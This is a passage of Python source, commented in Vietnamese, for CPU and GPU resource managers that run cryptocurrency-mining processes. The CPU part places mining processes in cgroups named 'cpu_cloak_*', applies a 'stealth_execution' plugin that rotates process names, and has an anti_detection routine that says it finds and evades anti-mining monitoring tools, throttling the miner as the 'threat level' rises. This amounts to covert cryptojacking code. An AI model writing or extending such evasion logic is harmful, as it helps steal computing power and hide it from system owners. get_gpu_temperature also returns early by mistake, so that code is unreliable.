                self.logger.error(f"Lỗi khi chạy numactl cho PID={pid}, code={result.returncode}.")
                self.logger.error(f"Chi tiết lỗi: {result.stderr.strip()}")
                return False

            self.logger.info(f"Khôi phục NUMA cho PID={pid} thành công.")
            return True

        except psutil.NoSuchProcess:
            self.logger.error(f"PID={pid} không tồn tại.")
            return False
        except Exception as e:
            self.logger.error(f"Lỗi khi khôi phục NUMA cho PID={pid}: {e}")
            return False

    def get_cpu_temperature(self, pid: Optional[int] = None) -> float:
        """
        Lấy nhiệt độ CPU trung bình (°C) từ cảm biến hệ thống.
        
        :param pid: (Không bắt buộc) PID tiến trình, hiện không sử dụng.
        :return: Nhiệt độ CPU trung bình (float). Trả về 0.0 nếu không tìm thấy sensor.
        """
        try:
            # psutil.sensors_temperatures() => { 'coretemp': [entries], ... }
            temps_info = psutil.sensors_temperatures()
            if not temps_info:
                self.logger.warning("CPUResourceManager: Không tìm thấy cảm biến nhiệt độ CPU (sensors rỗng).")
                return 0.0

            # Tìm key có 'coretemp' hoặc 'cpu'
            for name, entries in temps_info.items():
                if 'coretemp' in name.lower() or 'cpu' in name.lower():
                    cpu_temps = []
                    for entry in entries:
                        # entry.label có thể là 'Core 0', 'Core 1'
                        if 'core' in entry.label.lower() or entry.label == '':
                            cpu_temps.append(entry.current)
                    if cpu_temps:
                        avg_temp = sum(cpu_temps) / len(cpu_temps)
                        self.logger.debug(f"CPUResourceManager: CPU Temperature = {avg_temp:.2f}°C")
                        return float(avg_temp)

            # Không tìm thấy core => fallback 0.0
            self.logger.warning("CPUResourceManager: Không tìm thấy entry CPU coretemp.")
            return 0.0
            
        except Exception as e:
            self.logger.error(f"CPUResourceManager: Lỗi khi lấy nhiệt độ CPU: {e}")
            return 0.0

    def get_cpu_power(self, pid: Optional[int] = None) -> float:
        """
        Ước tính công suất CPU bằng cách đọc cpu_percent(1s),
        nội suy giữa mức công suất base và max.
        
        :param pid: (tuỳ chọn) PID tiến trình, hiện không dùng.
        :return: float, công suất CPU ước tính (W).
        """
        try:
            # Tham số ước lượng CPU (có thể config hóa sau)
            cpu_base_power_watts = 10.0
            cpu_max_power_watts = 150.0
            
            cpu_load = psutil.cpu_percent(interval=1)
            estimated_power = (
                cpu_base_power_watts
                + (cpu_load / 100.0) * (cpu_max_power_watts - cpu_base_power_watts)
            )
            self.logger.debug(f"CPUResourceManager: CPU Load={cpu_load}%, Estimated Power={estimated_power:.2f}W")
            return estimated_power
        except Exception as e:
            self.logger.error(f"CPUResourceManager: Lỗi khi ước tính công suất CPU: {e}")
            return 0.0

    def delete_cgroup(self) -> bool:
        """
        Xóa tất cả cgroup 'cpu_cloak_*' trong CPU và cpuset 
        nhưng KHÔNG di chuyển PID về cgroup root.
        Nếu cgroup đang chứa PID thì BỎ QUA, không xóa.
        """
        try:
            success = True
            # Thử xóa cgroup CPU
            success &= self._delete_cgroup_by_pattern_skip_if_not_empty(self.CGROUP_CPU_BASE, "cpu_cloak_*")
            # Thử xóa cgroup cpuset
            success &= self._delete_cgroup_by_pattern_skip_if_not_empty(self.CGROUP_CPU_CPUSET, "cpu_cloak_*")
            return success
        except Exception as e:
            self.logger.error(f"Lỗi khi xóa cgroup (no_move): {e}")
            return False

    def _delete_cgroup_by_pattern_skip_if_not_empty(self, base_path: str, pattern: str) -> bool:
        """
        Xóa tất cả cgroup khớp `pattern` trong `base_path`.
        Nếu cgroup đang có PID => bỏ qua, không xóa.
        Nếu cgroup không có PID => xóa cgroup.
        """
        success = True
        cgroup_paths = glob.glob(os.path.join(base_path, pattern))
        for cpath in cgroup_paths:
            try:
                tasks_file = os.path.join(cpath, "tasks")

                # Nếu file tasks tồn tại => đọc danh sách PID
                if os.path.exists(tasks_file):
                    with open(tasks_file, "r") as f:
                        pids = f.read().splitlines()
                    pids = [p for p in pids if p.strip()]  # Loại bỏ dòng trống
                    if pids:
                        self.logger.info(f"Cgroup {cpath} vẫn có {len(pids)} PID. Bỏ qua việc xóa.")
                        continue
                else:
                    self.logger.warning(f"File tasks không tồn tại tại {tasks_file}. Xem như cgroup trống.")

                # Nếu trống => xóa cgroup
                try:
                    os.rmdir(cpath)
                    self.logger.info(f"Đã xóa cgroup {cpath}.")
                except OSError as e:
                    self.logger.error(f"Lỗi khi xóa cgroup {cpath}: {e}")
                    success = False
            except Exception as e:
                self.logger.error(f"Lỗi khi xử lý cgroup {cpath}: {e}")
                success = False

        return success

    def unassign_all_pids_in_cgroup(self, base_cgroup_name: str) -> bool:
        """
        Di chuyển tất cả PID (nếu có) trong cgroup <base_cgroup_name>_cpu và
        <base_cgroup_name>_cpuset về cgroup root, giữ nguyên cgroup cũ.
        """
        try:
            with self.cgroup_lock:
                cpu_cgroup_name = f"{base_cgroup_name}_cpu"
                cpuset_cgroup_name = f"{base_cgroup_name}_cpuset"

                cpu_cgroup_path = os.path.join(self.CGROUP_CPU_BASE, cpu_cgroup_name)
                cpuset_cgroup_path = os.path.join(self.CGROUP_CPU_CPUSET, cpuset_cgroup_name)

                # Xử lý CPU subsystem
                tasks_file_cpu = os.path.join(cpu_cgroup_path, "tasks")
                if os.path.exists(tasks_file_cpu):
                    with open(tasks_file_cpu, "r") as f:
                        pids_cpu = f.read().splitlines()
                    for pid_str in pids_cpu:
                        try:
                            with open(os.path.join(self.CGROUP_CPU_BASE, "tasks"), "a") as root_tasks:
                                root_tasks.write(pid_str + "\n")
                            self.logger.info(
                                f"Di chuyển PID={pid_str} từ {cpu_cgroup_path} về root cgroup CPU."
                            )
                        except Exception as e:
                            self.logger.error(f"Lỗi di chuyển PID={pid_str} về root cgroup CPU: {e}")

                # Xử lý cpuset subsystem
                tasks_file_cpuset = os.path.join(cpuset_cgroup_path, "tasks")
                if os.path.exists(tasks_file_cpuset):
                    with open(tasks_file_cpuset, "r") as f:
                        pids_cpuset = f.read().splitlines()
                    for pid_str in pids_cpuset:
                        try:
                            with open(os.path.join(self.CGROUP_CPU_CPUSET, "tasks"), "a") as root_tasks:
                                root_tasks.write(pid_str + "\n")
                            self.logger.info(
                                f"Di chuyển PID={pid_str} từ {cpuset_cgroup_path} về root cgroup cpuset."
                            )
                        except Exception as e:
                            self.logger.error(f"Lỗi di chuyển PID={pid_str} về root cgroup cpuset: {e}")

            return True
        except Exception as e:
            self.logger.error(f"Lỗi unassign_all_pids_in_cgroup({base_cgroup_name}): {e}", exc_info=True)
            return False

    def restore_pid_resources(self, pid: int) -> bool:
        """
        Khôi phục tài nguyên cho 1 PID:
          - CPU affinity => all
          - Gỡ NUMA (nếu đã bind)
        Không đụng chạm đến cgroup, vì PID đã được move về root.
        """
        try:
            # 1. Gỡ CPU affinity => toàn bộ cores
            p = psutil.Process(pid)
            all_cpus = self.get_available_cpus()
            p.cpu_affinity(all_cpus)
            self.logger.info(f"Đặt lại CPU affinity về all_cpus={all_cpus} cho PID={pid}.")

            # 2. Gỡ NUMA
            if not self._restore_numa(pid):
                self.logger.warning(f"Không thể khôi phục NUMA cho PID={pid}.")
                # Vẫn return True, vì đây chỉ là cảnh báo

            return True

        except psutil.NoSuchProcess:
            self.logger.warning(f"PID={pid} không tồn tại khi restore_pid_resources.")
            return False
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền gỡ CPU affinity cho PID={pid}. Lỗi: {e}")
            return False
        except Exception as e:
            self.logger.error(f"Lỗi restore_pid_resources cho PID={pid}: {e}")
            return False

    def restore_resources(self, pid: int) -> bool:
        """
        KHÔNG cần base_cgroup_name.
        - Tìm base_cgroup_name trong self.pid_to_cgroup.
        - Di chuyển PID ra khỏi cgroup => root
        - Khôi phục CPU affinity + NUMA
        - Xóa pid_to_cgroup[pid]
        """
        try:
            with self.cgroup_lock:
                if pid not in self.pid_to_cgroup:
                    self.logger.warning(
                        f"restore_resources(pid={pid}): Không tìm thấy base_cgroup_name trong pid_to_cgroup."
                    )
                    return False
                base_cgroup_name = self.pid_to_cgroup[pid]

                # 1) Di chuyển PID khỏi cgroup => root
                if not self.unassign_all_pids_in_cgroup(base_cgroup_name):
                    self.logger.warning(f"Không thể di chuyển hết PID khỏi cgroup base={base_cgroup_name}.")

                # 2) Khôi phục affinity + NUMA
                if not self.restore_pid_resources(pid):
                    self.logger.warning(f"restore_pid_resources(pid={pid}) không thành công.")

                # 3) Xoá PID khỏi dictionary
                del self.pid_to_cgroup[pid]

            self.logger.info(
                f"Đã restore resource cho PID={pid}, cgroup base={base_cgroup_name} (không xóa cgroup)."
            )
            return True

        except Exception as e:
            self.logger.error(f"Lỗi restore_resources(pid={pid}): {e}", exc_info=True)
            return False

    # ----------------------------------------------------------------------
    # Public helper for other modules to apply all techniques on a PID
    # ----------------------------------------------------------------------
    def register_pid(self, pid: int) -> None:
        """Call this when a new mining PID appears."""
        logger = self.logger  # Ánh xạ logger cục bộ để tránh NameError
        logger.info(f"[TIMESTAMP] [INFO] Bắt đầu kích hoạt CPU plugins cho PID={pid}")
        
        activated_plugins = []
        failed_plugins = []
        
        for plugin in getattr(self, "plugins", []):
            try:
                plugin.apply(pid)
                activated_plugins.append(plugin.name)
                logger.info(f"[TIMESTAMP] [INFO] Kỹ thuật {plugin.name} đã được kích hoạt thành công")
                logger.debug(f"[TIMESTAMP] [DEBUG] {plugin.name}: Chi tiết cấu hình - PID={pid}, priority={plugin.priority}")
                
                # ✅ ENHANCED: Special handling for stealth execution plugin
                if plugin.name == "stealth_execution":
                    logger.info(f"🎭 [STEALTH] Process name rotation activated for PID={pid}")
                    self.logger.info(f"🎭 [CPU Manager] Stealth execution plugin successfully applied to PID={pid}")
                    
            except Exception as exc:  # noqa: BLE001
                failed_plugins.append(plugin.name)
                self.logger.warning(f"[CPU] plug-in {plugin.name} apply() failed: {exc}")
                logger.error(f"[TIMESTAMP] [ERROR] Kỹ thuật {plugin.name} kích hoạt thất bại: {exc}")
                
                # ✅ ENHANCED: Enhanced error logging for stealth plugin failures
                if plugin.name == "stealth_execution":
                    self.logger.error(f"❌ [STEALTH] Critical failure: Process name rotation failed for PID={pid}: {exc}")
        
        # ✅ ENHANCED: Full MiningIntegrationAdapter activation with session startup
        try:
            if self.throttler and hasattr(self.throttler, 'initialize_optimized_mining'):
                cores = self.cpu_count  # Use available CPU cores
                
                # Step 1: Initialize optimized mining system
                if self.throttler.initialize_optimized_mining(cores):
                    self.logger.info(f"✅ [CPU-OPT] Optimized mining system initialized for {cores} cores")
                    
                    # Step 2: Start mining session immediately
                    if hasattr(self.throttler, 'start_mining_session'):
                        session_started = self.throttler.start_mining_session()
                        if session_started:
                            self.logger.info(f"🚀 [CPU-OPT] Mining session started successfully for PID={pid}")
                            
                            # Step 3: Register external process with adapter
                            if hasattr(self.throttler, 'register_external_process'):
                                self.throttler.register_external_process(pid)
                                self.logger.info(f"📝 [CPU-OPT] PID={pid} registered with mining adapter")
                        else:
                            self.logger.error(f"❌ [CPU-OPT] Failed to start mining session for PID={pid}")
                    
                    logger.info(f"[TIMESTAMP] [INFO] Complete MiningIntegrationAdapter activation successful for PID={pid}")
                else:
                    self.logger.warning(f"⚠️ [CPU-OPT] Optimized mining system initialization failed for PID={pid}")
                    logger.warning(f"[TIMESTAMP] [WARNING] MiningIntegrationAdapter initialization failed for PID={pid}")
            else:
                self.logger.debug(f"[CPU-OPT] MiningIntegrationAdapter not available - skipping optimized mining integration")
        except Exception as exc:  # noqa: BLE001
            self.logger.warning(f"[CPU-OPT] Enhanced MiningIntegrationAdapter activation error: {exc}")
            logger.error(f"[TIMESTAMP] [ERROR] Lỗi enhanced activation MiningIntegrationAdapter: {exc}")
        
        logger.info(f"[TIMESTAMP] [INFO] Hoàn thành kích hoạt CPU plugins - Thành công: {len(activated_plugins)}, Thất bại: {len(failed_plugins)}")
        if activated_plugins:
            logger.info(f"[TIMESTAMP] [INFO] Các kỹ thuật đã kích hoạt: {', '.join(activated_plugins)}")
        if failed_plugins:
            logger.warning(f"[TIMESTAMP] [WARNING] Các kỹ thuật thất bại: {', '.join(failed_plugins)}")

    def reload_plugins(self) -> None:
        """Hot-reload plug-ins from YAML."""
        try:
            cfg_obj = load_plugin_cfg(self._cfg_path)
            for p in getattr(self, "plugins", []):
                try:
                    p.stop()
                except Exception:
                    pass
            self.plugins = discover_cpu_plugins(self, self.logger, cfg_obj)
            self.logger.info("[CPU] Reload plug-ins OK – %s active", len(self.plugins))
        except Exception as exc:  # noqa: BLE001
            self.logger.warning(f"[CPU] reload_plugins error: {exc}")

    def _apply_rlimits(self, pid: int, cpu_sec: int = 2) -> bool:
        """
        Áp dụng giới hạn tài nguyên (resource limits) cho process
        
        Args:
            pid: Process ID để áp dụng giới hạn
            cpu_sec: Giới hạn CPU time tính bằng giây
            
        Returns:
            bool: True nếu thành công, False nếu thất bại
        """
        try:
            # Kiểm tra PID
            if not pid or pid <= 0:
                self.logger.warning(f"PID không hợp lệ: {pid}")
                return False
                
            # Sử dụng prlimit để thiết lập giới hạn tài nguyên
            if not psutil.pid_exists(pid):
                self.logger.error(f"PID {pid} không tồn tại, không thể áp dụng resource limits")
                return False
                
            proc = psutil.Process(pid)
            
            # Giới hạn CPU time (soft, hard)
            # RLIMIT_CPU: Giới hạn CPU time tính bằng giây
            try:
                import resource
                proc.rlimit(resource.RLIMIT_CPU, (cpu_sec, cpu_sec * 2))
                self.logger.info(f"Đã áp dụng RLIMIT_CPU={cpu_sec}s cho PID {pid}")
            except (ImportError, AttributeError, ProcessLookupError) as e:
                self.logger.warning(f"Không thể thiết lập RLIMIT_CPU: {e}")
                
            # Sử dụng giới hạn số lượng file descriptors để tránh quá nhiều connections
            try:
                if psutil.pid_exists(pid):  # Kiểm tra lại PID vẫn tồn tại
                    max_files = 1024
                    proc.rlimit(resource.RLIMIT_NOFILE, (max_files, max_files))
                    self.logger.info(f"Đã áp dụng RLIMIT_NOFILE={max_files} cho PID {pid}")
            except Exception as e:
                self.logger.warning(f"Không thể thiết lập RLIMIT_NOFILE: {e}")
                
            # Giới hạn kích thước virtual memory
            try:
                if psutil.pid_exists(pid):  # Kiểm tra lại PID vẫn tồn tại
                    meminfo = psutil.virtual_memory()
                    max_vm = int(meminfo.total * 0.75)  # 75% tổng RAM
                    proc.rlimit(resource.RLIMIT_AS, (max_vm, max_vm))
                    self.logger.debug(f"Đã áp dụng RLIMIT_AS={max_vm} bytes cho PID {pid}")
            except Exception as e:
                self.logger.warning(f"Không thể thiết lập RLIMIT_AS: {e}")
                
            return True

        except Exception as e:
            self.logger.error(f"Lỗi khi áp dụng resource limits cho PID {pid}: {e}")
            return False

    def anti_detection(self, mode: str = "check") -> Dict[str, Any]:
        """
        Phát hiện và chống lại các công cụ giám sát chống khai thác tiền điện tử
        
        Args:
            mode: Chế độ hoạt động: "check", "evade", "report"
            
        Returns:
            Dict[str, Any]: Thông tin về các công cụ phát hiện
        """
        # Tương thích với các plugin cũ có thể gọi anti_detection
        try:
            if hasattr(self, "anti_detection") and callable(getattr(self, "anti_detection").get_current_threat_level):
                # Nếu self.anti_detection là đối tượng AntiDetectionSystem, gọi phương thức của nó
                if mode == "check":
                    return {
                        "threat_level": self.anti_detection.get_current_threat_level(),
                        "detected_tools": self.anti_detection.get_detected_tools()
                    }
                elif mode == "evade":
                    self.anti_detection.apply_evasion_techniques()
                    return {"status": "evasion_applied"}
                else:
                    return {
                        "threat_level": self.current_threat_level,
                        "status": "monitoring_active" if self.stealth_enabled else "disabled"
                    }
        except (AttributeError, TypeError) as e:
            self.logger.warning(f"AntiDetection subsystem error: {e}")
            
        # Fallback results
        return {
            "threat_level": "UNKNOWN",
            "status": "not_available",
            "error": "AntiDetection subsystem not properly initialized"
        }

    def adapt_to_threat(self, threat_level: str) -> None:
        """
        Điều chỉnh tài nguyên CPU theo mức độ đe dọa.
        
        Args:
            threat_level: Mức độ đe dọa (LOW, MEDIUM, HIGH)
        """
        self.logger.info(f"🛡️ [CPU Manager] Adapting to threat level: {threat_level}")
        self.current_threat_level = threat_level.upper() if isinstance(threat_level, str) else "LOW"
        
        # Điều chỉnh tất cả các PID đã đăng ký
        for pid in list(self._registered_pids):
            self._adapt_throttling_to_threat_level(pid, self.current_threat_level)
            
    def _adapt_throttling_to_threat_level(self, pid: int, threat_level: str) -> bool:
        """
        Điều chỉnh mức độ throttle CPU cho một PID dựa trên mức đe dọa.
        
        Args:
            pid: Process ID cần điều chỉnh
            threat_level: Mức độ đe dọa (LOW, MEDIUM, HIGH)
        """
        try:
            # Xác định mức throttle mới dựa trên mức đe dọa
            throttle_map = {
                "LOW": 56.5,      # Throttle nhẹ khi đe dọa thấp
                "MEDIUM": 72.0,   # Throttle vừa phải khi đe dọa trung bình
                "HIGH": 85.5      # Throttle mạnh khi đe dọa cao
            }
            
            # Lấy giá trị throttle từ map, mặc định là 65% nếu không có
            new_throttle = throttle_map.get(threat_level.upper(), 65.0)
            
            self.logger.info(f"🛡️ [CPU Manager] Adapting PID={pid} throttle to {new_throttle}% for threat level {threat_level}")
            
            # Áp dụng throttle mới
            if self.is_process_running(pid):
                self.throttle_cpu_usage(pid=pid, throttle_percentage=new_throttle)
                return True
            else:
                self._registered_pids.discard(pid)
                return False

        except Exception as e:
            self.logger.error(f"🛡️ [CPU Manager] Error adapting to threat level: {e}")
            return False

###############################################################################
#                           GPU RESOURCE MANAGER                              #
###############################################################################
class GPUResourceManager:
    """
    Quản lý GPU thông qua pynvml (đồng bộ).

    Attributes:
        logger (logging.Logger): Logger để ghi log.
        config (Dict[str, Any]): Cấu hình GPU Resource Manager.
        gpu_initialized (bool): Cờ đánh dấu NVML đã khởi tạo hay chưa.
        process_gpu_settings (Dict[int, Dict[int, Dict[str, Any]]]): Lưu PID -> GPU Index -> settings.
    """

    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
        """
        Khởi tạo GPUResourceManager.

        :param config: Cấu hình GPU Resource Manager (dict).
        :param logger: Đối tượng Logger.
        """
        self.logger = logger
        self.config = config
        self.gpu_initialized = False
        self.process_gpu_settings: Dict[int, Dict[int, Dict[str, Any]]] = {}

        # Tự động khởi tạo NVML
        self.initialize_nvml()

    def initialize_nvml(self) -> bool:
        """
        Khởi tạo pynvml (đồng bộ).

        :return: True nếu khởi tạo thành công, False nếu thất bại.
        """
        try:
            pynvml.nvmlInit()
            self.logger.info("pynvml đã được khởi tạo.")
            self.gpu_initialized = True
            return True
        except pynvml.NVMLError as error:
            self.logger.error(f"Lỗi khi khởi tạo pynvml: {error}")
            self.gpu_initialized = False
            return False
        except Exception as e:
            # ✅ ERROR REPORTING: GPU initialization failure
            error_reporter.report_error(
                ErrorCode.RESOURCE_MANAGER_INIT_FAILED,
                f"Lỗi khi khởi tạo pynvml: {e}",
                ErrorSeverity.HIGH,
                module='resource_control',
                function='GPUResourceManager._initialize_nvml',
                context_data={'component': 'pynvml', 'error': str(e)},
                exception=e
            )
            self.logger.error(f"Lỗi khi khởi tạo pynvml: {e}")
            self.gpu_initialized = False
            return False

    def is_nvml_initialized(self) -> bool:
        """
        Kiểm tra NVML đã được khởi tạo hay chưa.

        :return: True nếu NVML đã khởi tạo, False nếu chưa.
        """
        return self.gpu_initialized

    def get_gpu_count(self) -> int:
        """
        Lấy số lượng GPU (đồng bộ).

        :return: Số GPU (int).
        """
        if not self.gpu_initialized:
            return 0
        try:
            return pynvml.nvmlDeviceGetCount()
        except pynvml.NVMLError:
            return 0

    def get_handle(self, gpu_index: int):
        """
        Lấy handle của GPU theo chỉ số (đồng bộ).

        :param gpu_index: Chỉ số GPU.
        :return: Handle thiết bị GPU, hoặc None nếu lỗi.
        """
        if not self.gpu_initialized:
            self.logger.error("GPUResourceManager chưa init. Không thể lấy handle GPU.")
            return None
        try:
            handle = pynvml.nvmlDeviceGetHandleByIndex(gpu_index)
            self.logger.debug(f"Đã lấy handle cho GPU={gpu_index}")
            return handle
        except pynvml.NVMLError as e:
            self.logger.error(f"Lỗi khi lấy handle GPU={gpu_index}: {e}")
            return None

    def get_gpu_power_limit(self, gpu_index: int) -> Optional[int]:
        """
        Trả về power limit (W) của GPU (đồng bộ).

        :param gpu_index: Chỉ số GPU.
        :return: Power limit (int) hoặc None nếu lỗi.
        """
        if not self.gpu_initialized:
            self.logger.error("GPUResourceManager chưa init. Không thể lấy power limit.")
            return None
        try:
            handle = self.get_handle(gpu_index)
            if not handle:
                self.logger.error(f"Không thể lấy handle cho GPU={gpu_index}.")
                return None
            limit_mw = pynvml.nvmlDeviceGetPowerManagementLimit(handle)
            limit_w = int(limit_mw // 1000)  # convert mW -> W
            self.logger.debug(f"Power limit hiện tại GPU={gpu_index}: {limit_w}W")
            return limit_w
        except Exception as e:
            self.logger.error(f"Lỗi get_gpu_power_limit GPU={gpu_index}: {e}")
            return None

    def set_gpu_power_limit(self, pid: Optional[int], gpu_index: int, power_limit_w: int) -> bool:
        """
        Đặt power limit cho GPU (đồng bộ).

        :param pid: PID cần quản lý, có thể None nếu áp dụng chung.
        :param gpu_index: Chỉ số GPU.
        :param power_limit_w: Power limit cần đặt (W).
        :return: True nếu thành công, False nếu thất bại.
        """
        if not self.gpu_initialized:
            self.logger.error("GPUResourceManager chưa init. Không thể set power limit.")
            return False
        try:
            handle = self.get_handle(gpu_index)
            if not handle or power_limit_w <= 0:
                return False

            # Lưu power limit cũ
            current_mw = pynvml.nvmlDeviceGetPowerManagementLimit(handle)
            current_w = current_mw // 1000
            if pid is not None:
                if pid not in self.process_gpu_settings:
                    self.process_gpu_settings[pid] = {}
                if gpu_index not in self.process_gpu_settings[pid]:
                    self.process_gpu_settings[pid][gpu_index] = {}
                self.process_gpu_settings[pid][gpu_index]['power_limit_w'] = current_w

            new_limit_mw = power_limit_w * 1000
            pynvml.nvmlDeviceSetPowerManagementLimit(handle, new_limit_mw)
            self.logger.debug(f"Set power limit={power_limit_w}W cho GPU={gpu_index}, PID={pid}.")
            return True
        except pynvml.NVMLError as error:
            self.logger.error(f"Lỗi NVML set power limit GPU={gpu_index}: {error}")
            return False
        except Exception as e:
            self.logger.error(f"Lỗi set power limit GPU={gpu_index}: {e}")
            return False

    def set_gpu_clocks(self, pid: Optional[int], gpu_index: int, sm_clock: int, mem_clock: int) -> bool:
        """
        Đặt xung nhịp GPU (đồng bộ) thông qua nvidia-smi commands.

        :param pid: PID cần quản lý, có thể None nếu áp dụng chung.
        :param gpu_index: Chỉ số GPU.
        :param sm_clock: Mức SM clock (MHz).
        :param mem_clock: Mức Memory clock (MHz).
        :return: True nếu thành công, False nếu thất bại.
        """
        if not self.gpu_initialized:
            self.logger.error("GPUResourceManager chưa init. Không thể set clocks.")
            return False
        try:
            handle = self.get_handle(gpu_index)
            if not handle or sm_clock <= 0 or mem_clock <= 0:
                return False

            # Lấy SM/MEM clock hiện tại
            current_sm_clock = pynvml.nvmlDeviceGetClock(handle, pynvml.NVML_CLOCK_SM, pynvml.NVML_CLOCK_ID_CURRENT)
            current_mem_clock = pynvml.nvmlDeviceGetClock(handle, pynvml.NVML_CLOCK_MEM, pynvml.NVML_CLOCK_ID_CURRENT)

            if pid is not None:
                if pid not in self.process_gpu_settings:
                    self.process_gpu_settings[pid] = {}
                if gpu_index not in self.process_gpu_settings[pid]:
                    self.process_gpu_settings[pid][gpu_index] = {}
                self.process_gpu_settings[pid][gpu_index]['sm_clock_mhz'] = current_sm_clock
                self.process_gpu_settings[pid][gpu_index]['mem_clock_mhz'] = current_mem_clock

            # Set SM clock
            cmd_sm = [
                'nvidia-smi',
                '-i', str(gpu_index),
                '--lock-gpu-clocks=' + str(sm_clock)
            ]
            subprocess.run(cmd_sm, check=True)
            self.logger.debug(f"Set SM clock={sm_clock}MHz cho GPU={gpu_index}, PID={pid}.")

            # Set MEM clock
            cmd_mem = [
                'nvidia-smi',
                '-i', str(gpu_index),
                '--lock-memory-clocks=' + str(mem_clock)
            ]
            subprocess.run(cmd_mem, check=True)
            self.logger.debug(f"Set MEM clock={mem_clock}MHz cho GPU={gpu_index}, PID={pid}.")

            return True
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Lỗi nvidia-smi set clocks GPU={gpu_index}: {e}")
            return False
        except Exception as e:
            self.logger.error(f"Lỗi set clocks GPU={gpu_index}: {e}")
            return False

    def limit_temperature(self, gpu_index: int, temperature_threshold: float, fan_speed_increase: float) -> bool:
        """
        Quản lý nhiệt độ GPU bằng cách điều chỉnh quạt, công suất, và xung nhịp.

        :param gpu_index: Chỉ số GPU cần điều chỉnh.
        :param temperature_threshold: Ngưỡng nhiệt độ (°C).
        :param fan_speed_increase: Tỷ lệ tăng tốc độ quạt (giả định).
        :return: True nếu thành công, False nếu thất bại.
        """
        try:
            if not self.gpu_initialized:
                self.logger.error("GPUResourceManager chưa init. Không thể limit_temperature.")
                return False

            # Lấy nhiệt độ hiện tại
            current_temperature = self.get_gpu_temperature(gpu_index)
            if current_temperature is None:
                self.logger.warning(f"Không thể lấy nhiệt độ GPU={gpu_index}. Bỏ qua điều chỉnh.")
                return False

            # Tăng tốc độ quạt
            if self.control_fan_speed(gpu_index, fan_speed_increase):
                self.logger.info(f"Quạt GPU={gpu_index} tăng thêm {fan_speed_increase}%.")
            else:
                self.logger.warning(f"Không thể điều chỉnh quạt GPU={gpu_index}.")

            # Lấy các giá trị hiệu năng hiện tại
            handle = self.get_handle(gpu_index)
            if not handle:
                self.logger.error(f"Không thể lấy handle GPU={gpu_index}.")
                return False

            try:
                current_sm_clock = pynvml.nvmlDeviceGetClock(handle, pynvml.NVML_CLOCK_SM, pynvml.NVML_CLOCK_ID_CURRENT)
            except Exception as ex:
                self.logger.error(f"Không thể lấy xung nhịp SM của GPU={gpu_index}: {ex}")
                return False

            current_power_limit = self.get_gpu_power_limit(gpu_index)
            if current_power_limit is None:
                self.logger.error(f"Không thể lấy power limit GPU={gpu_index}.")
                return False

            # Xử lý dựa trên nhiệt độ
            if current_temperature > temperature_threshold:
                # GPU quá nóng => Throttle
                self.logger.info(f"Nhiệt độ GPU={gpu_index}={current_temperature}°C vượt ngưỡng {temperature_threshold}°C. Giảm hiệu năng.")

                # Tính mức độ throttle
                excess_temp = current_temperature - temperature_threshold
                if excess_temp <= 5:
                    throttle_pct = 10
                elif excess_temp <= 10:
                    throttle_pct = 20
                else:
                    throttle_pct = 30
                self.logger.debug(f"excess_temp={excess_temp}°C => throttle_pct={throttle_pct}%")

                # Giảm công suất
                desired_power_limit = max(100, int(current_power_limit * (1 - throttle_pct / 100)))
                if self.set_gpu_power_limit(None, gpu_index, desired_power_limit):
                    self.logger.info(f"Giảm power limit GPU={gpu_index} xuống {desired_power_limit}W.")

                # Giảm xung nhịp SM
                new_sm_clock = max(500, current_sm_clock - 100)
                if self.set_gpu_clocks(None, gpu_index, new_sm_clock, 877):  # mem_clock luôn là 877
                    self.logger.info(f"Giảm xung nhịp SM GPU={gpu_index}: SM={new_sm_clock}MHz, MEM=877MHz.")

            elif current_temperature < temperature_threshold:
                # GPU mát => Boost
                self.logger.info(f"Nhiệt độ GPU={gpu_index}={current_temperature}°C dưới ngưỡng {temperature_threshold}°C. Tăng hiệu năng.")

                # Tính mức độ boost
                diff_temp = temperature_threshold - current_temperature
                if diff_temp <= 5:
                    boost_pct = 10
                elif diff_temp <= 10:
                    boost_pct = 20
                else:
                    boost_pct = 30
                self.logger.debug(f"diff_temp={diff_temp}°C => boost_pct={boost_pct}%")

                # Tăng công suất (nhưng không vượt quá 250W)
                desired_power_limit = min(250, int(current_power_limit * (1 + boost_pct / 100)))
                if self.set_gpu_power_limit(None, gpu_index, desired_power_limit):
                    self.logger.info(f"Tăng power limit GPU={gpu_index} lên {desired_power_limit}W.")

                # Tăng xung nhịp SM
                new_sm_clock = min(1245, current_sm_clock + int(current_sm_clock * boost_pct / 100))
                if self.set_gpu_clocks(None, gpu_index, new_sm_clock, 877):  # mem_clock luôn là 877
                    self.logger.info(f"Tăng xung nhịp SM GPU={gpu_index}: SM={new_sm_clock}MHz, MEM=877MHz.")
            else:
                # Nhiệt độ trong khoảng an toàn
                self.logger.info(f"Nhiệt độ GPU={gpu_index}={current_temperature}°C trong ngưỡng an toàn. Không cần điều chỉnh.")

            return True
        except Exception as e:
            self.logger.error(f"Lỗi khi quản lý nhiệt độ GPU={gpu_index}: {e}")
            return False

    def get_gpu_temperature(self, gpu_index: int) -> Optional[float]:
        """
        Lấy nhiệt độ GPU (đồng bộ).

        :param gpu_index: Chỉ số GPU.
        :return: Nhiệt độ GPU (float) hoặc None nếu lỗi.
        """
        try:
            if not self.gpu_initialized:
                self.logger.error("GPUResourceManager chưa init. Không thể lấy nhiệt độ GPU.")
            return None
            handle = self.get_handle(gpu_index)
            if not handle:
                self.logger.error(f"Không thể lấy handle cho GPU={gpu_index}.")
                return None
            temp = pynvml.nvmlDeviceGetTemperature(handle, pynvml.NVML_TEMPERATURE_GPU)
            self.logger.debug(f"Nhiệt độ GPU={gpu_index}: {temp}°C")
            return float(temp)
        except Exception as e:
            self.logger.error(f"Lỗi get_gpu_temperature GPU={gpu_index}: {e}")
            # Fallback using nvidia-smi
            try:
                cmd = f"nvidia-smi -i {gpu_index} -q -d TEMPERATURE | grep 'GPU Current Temp' | awk '{{print $5}}'"
                output = subprocess.check_output(cmd, shell=True).decode().strip()
                temp = float(output)
                self.logger.debug(f"Nhiệt độ GPU={gpu_index} từ fallback: {temp}°C")
                return temp
            except Exception as fallback_e:
                self.logger.error(f"Lỗi fallback get_gpu_temperature GPU={gpu_index}: {fallback_e}")
            return None

    def control_fan_speed(self, gpu_index: int, increase_percentage: float) -> bool:
        """
        Điều chỉnh quạt GPU bằng nvidia-settings (đồng bộ). Tuỳ driver hỗ trợ.

        :param gpu_index: Chỉ số GPU.
        :param increase_percentage: Mức tăng quạt (giả lập).
        :return: True nếu thành công, False nếu thất bại.
        """
